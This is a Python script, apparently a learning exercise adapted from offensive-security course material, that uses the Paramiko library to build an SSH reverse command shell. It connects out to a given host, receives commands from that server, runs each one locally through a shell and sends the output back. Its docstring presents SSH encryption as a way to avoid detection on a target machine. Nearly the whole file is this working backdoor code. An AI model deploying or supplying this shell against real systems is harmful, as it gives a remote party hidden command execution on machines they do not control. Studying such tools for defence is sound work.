"""It can be wise to encrypt traffic to avoid detection using 
Secure Shell (SSH). The target may not have an SSH client 
(Windows systems usually do not)

With Python, raw sockets and some crypto magic can be used to 
create an SSH client and server. The Paramiko library uses 
PyCrypto, and provides simple access to the SSH2 protocol.

This script (and its accompanying ssh_server.py script) are for 
learning to use Paramiko to make a connection and run a command 
on an SSH system, configure an SSH server and SSH client to run 
remote commands on a Windows machine, and puzzle out the 
reverse tunnel demo file included with Paramiko to duplicate 
the proxy.py option made earlier (also in this directory).

Adopted and adapted from BlackHat 2021 and Gream
"""

# Future development:
# 
# The initial call to recv() is for printing a welcome message 
# at connection. This could be changed to a get_banner call.

import sys
import argparse
import threading
import subprocess

import paramiko


def parse_args(args):
    a = argparse.ArgumentParser()
    a.add_argument('host', help='host to connect to')
    a.add_argument('port', help='port to connect to', type=int)
    a.add_argument('username', help='Username to use')
    a.add_argument('password', help='Password to use')
    return a.parse_args(args)


def ssh_command(ip, port, user, passwd):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, passphrase=passwd, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        print(ssh_session.recv(1024).decode('utf-8'))
        try:
            while True:
                command = ssh_session.recv(1024)
                try:
                    cmd_input = command.decode('utf-8')
                    print('[<] Received input "{}"'.format(cmd_input))
                    cmd_output = subprocess.check_output(cmd_input, shell=True)
                    print('[>] Sending output "{}"'.format(cmd_output.decode('utf-8').strip()))
                    ssh_session.send(cmd_output)
                except Exception as e:
                    ssh_session.send(str(e).encode())
        except KeyboardInterrupt as e:
            print("[!!] Caught keyboard interrupt, exiting")
        client.close()
    return


if __name__ == '__main__':
    args = parse_args(sys.argv[1:])
    ssh_command(args.host, args.port, args.username, args.password)